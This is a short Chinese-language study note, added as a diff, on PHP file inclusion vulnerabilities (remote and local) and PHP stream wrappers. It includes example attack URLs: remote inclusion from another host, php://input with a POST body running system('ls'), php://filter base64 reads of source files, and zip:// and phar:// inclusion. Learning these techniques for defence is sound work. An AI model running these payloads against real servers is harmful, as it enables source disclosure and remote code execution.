@@ -1,0 +1,54 @@
+文件包含漏洞：分为远程文件包含RFI以及本地文件包含LFI
+在php，jsp，asp中都存在文件包含
+
+远程文件包含：
+  php配置选项allow_url_include为on，那么include()和require()函数都可以加载远程文件
+  http://xxx.com/include.php?url=http://bbb.com/1.txt
+  
+本地文件包含：
+ 包含用户上传到服务器的文件
+ 包含data:// 或者是 php://input等伪协议
+ 包含session文件
+ 包含日志文件
+ 
+ 
+ 
+php伪协议：
+  file:// — 访问本地文件系统
+  http:// — 访问 HTTP(s) 网址
+  ftp:// — 访问 FTP(s) URLs
+  php:// — 访问各个输入/输出流（I/O streams）
+  zlib:// — 压缩流
+  data:// — 数据（RFC 2397）
+  glob:// — 查找匹配的文件路径模式
+  phar:// — PHP 归档
+  ssh2:// — Secure Shell 2
+  rar:// — RAR
+  ogg:// — 音频流
+  expect:// — 处理交互式的流
+  
+  php://协议：
+    php://input  
+      读取到访问请求的原始数据的只读流，即读取POST上没有经过解析的数据。不支持multipart/form-data的类型的传码方式上传
+      利用：
+        http://xx.com/include.php?file=php://input  提交方式为post，在post数据放入代码如<?php system("ls")?>
+
+    php://filter
+      对磁盘中的文件进行读写,因此可以通过该协议来达到对文件的读取
+      http://127.0.0.1/test/include.php?a=php://filter/read=convert.base64-encode/resource=fupload.php　　　　#读取文件，将内容base64编码输出
+      resource= 要过滤的数据流
+      read = 读链的筛选列表
+      write = 写链的筛选列表
+      convert.base64-encode =>打开后是base64编码后的
+      
+    zip://
+      将压缩包里面的文件读取出来，并包含读取的文件，文件路径必须为绝对路径
+      http://127.0.0.1/test/include.php?a=zip://D:/phpstudy/WWW/test/hello.zip%23hello.txt　　　　// %23是#编码，因为要会和url中#定为冲突
+      
+    phar://
+      将压缩包里面的文件读取出来，并包含读取的文件，文件路径可用是相对路径
+      http://127.0.0.1/test/include.php?a=phar://hello.zip/hello.txt
+      
+      
+ 
+      
